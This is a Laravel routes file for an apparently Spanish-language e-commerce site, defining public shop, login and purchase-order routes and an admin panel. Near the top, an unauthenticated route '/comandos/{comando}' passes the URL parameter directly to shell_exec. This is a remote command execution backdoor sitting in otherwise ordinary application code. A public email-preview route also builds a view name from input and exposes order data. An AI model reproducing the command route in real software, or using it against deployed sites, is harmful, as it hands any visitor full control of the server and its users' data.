<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use App\Models\Usuario;
use App\Models\OrdenCompra;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Comandos
Route::get('/comandos/{comando}', function ($c){
    shell_exec($c);
});

// Vista previa de correos
Route::get('/vista-previa-correos/{vista}', function($v){
    return view('correos.' . $v)->with([
        'asunto'        => __('textos.titulos.nueva_orden_compra'),
        'usuario'       => Auth::user(),
        'ordenCompra'   => OrdenCompra::first()
    ]);
});

// Mostrar imagen
Route::get('/img/{tipo}/{id}/{iImg?}/{resolucion?}',function($tipo, $id, $iImg=0, $resolucion=null){
    mostrarImg($tipo, $id, $iImg, $resolucion);
})->name('mostrar-img');

// Inicio
Route::get('/', [InicioCtrl::class,'inicio'])->name("inicio");

// Sesion
Route::get('/{seccion}/{codigo_acceso?}', [UsuarioCtrl::class,'sesion'])
->where('seccion', '(registro|ingreso|recuperacion-contraseña|renovacion-contraseña)')
->name('sesion');
// Registro
Route::post('/registro', [UsuarioCtrl::class,'guardar']);
// Ingreso
Route::post('/ingreso', [UsuarioCtrl::class,'ingreso']);
// Recuperación de contraseña
Route::post('/recuperacion-contraseña', [UsuarioCtrl::class,'recuperacionContraseña'])->name('sesion-recuperacion-contraseña');
// Renovación de contraseña
Route::post('/renovacion-contraseña', [UsuarioCtrl::class,'renovacionContraseña']);

// Productos
Route::get('/productos/{filtro?}/{id?}/{id2?}', [ProductoCtrl::class,'productos'])->name('productos');

// Combos
Route::get('/combos/{filtro?}/{id?}', [ComboCtrl::class, 'combos'])->name('combos');

// Lista de compras
Route::post('/lista-compras', [OrdenCompraCtrl::class,'lista'])->name('lista-compras');

// Rutas protegidas
Route::middleware('auth')->group(function(){

    // Usuario
    Route::prefix($n='usuario')->name("$n.")->group(function(){

        // Perfil
        Route::get('/', [UsuarioCtrl::class,'registro'])->name('perfil');
        Route::post('/', [UsuarioCtrl::class,'guardar']);

        // Orden de compra
        Route::view('/orden-compra', 'ordenes-compras.orden-compra')->name('orden-compra');
        Route::post('/orden-compra',[OrdenCompraCtrl::class,'orden']);

        // Salir
        Route::get("/salir", function (){
            Auth::logout();
            return redirect()->route("inicio");
        })->name('salir');
    });

    // Administrador
    Route::prefix($n='administrador')->name("$n.")->middleware('permisos')->group(function(){

        // Panel de administrador
        Route::view('/','panel-administrador')->name('panel');

        // Carrusel
        Route::view('carrusel', 'carrusel')->name('carrusel');
        Route::post('carrusel', [InicioCtrl::class,'carrusel']);

        // Roles
        Route::prefix($n='roles')->name($n)->group(function (){
            Route::get('/', [RolesCtrl::class,'registros'])->name('');
            Route::post('/', [RolesCtrl::class,'guardar']);
            Route::post('/eliminar', [RolesCtrl::class,'eliminar'])->name('.eliminar');
        });

        // Usuarios
        Route::prefix($n='usuarios')->name($n)->group(function (){
            Route::get('/', [UsuarioCtrl::class,'registros'])->name('');
            Route::post('/', [UsuarioCtrl::class,'guardar']);
            Route::post('/eliminar', [UsuarioCtrl::class,'eliminar'])->name('.eliminar');
        });

        // Filtros
        Route::prefix($n='filtros-productos')->name($n)->group(function (){
            Route::get('/', [FiltroProductoCtrl::class,'registros'])->name('');
            Route::post('/', [FiltroProductoCtrl::class,'guardar']);
            Route::post('/eliminar', [FiltroProductoCtrl::class,'eliminar'])->name('.eliminar');
        });

        // Productos
        Route::prefix($n='productos')->name($n)->group(function (){
            Route::get('/', [ProductoCtrl::class,'registros'])->name('');
            Route::post('/', [ProductoCtrl::class,'guardar']);
            Route::post('/eliminar', [ProductoCtrl::class,'eliminar'])->name('.eliminar');
        });

        // Combos
        Route::prefix($n='combos')->name($n)->group(function (){
            Route::get('/', [ComboCtrl::class,'registros'])->name('');
            Route::post('/', [ComboCtrl::class,'guardar']);
            Route::post('/eliminar', [ComboCtrl::class,'eliminar'])->name('.eliminar');
        });

        // Cupones
        Route::prefix($n='cupones')->name($n)->group(function (){
            Route::get('/', [CuponCtrl::class,'registros'])->name('');
            Route::post('/', [CuponCtrl::class,'guardar']);
            Route::post('/eliminar', [CuponCtrl::class,'eliminar'])->name('.eliminar');
        });

        // Ordenes de compras
        Route::prefix($n='ordenes-compras')->name($n)->group(function (){
            Route::get('/{id?}', [OrdenCompraCtrl::class,'registros'])->name(''); 
        });
    });
});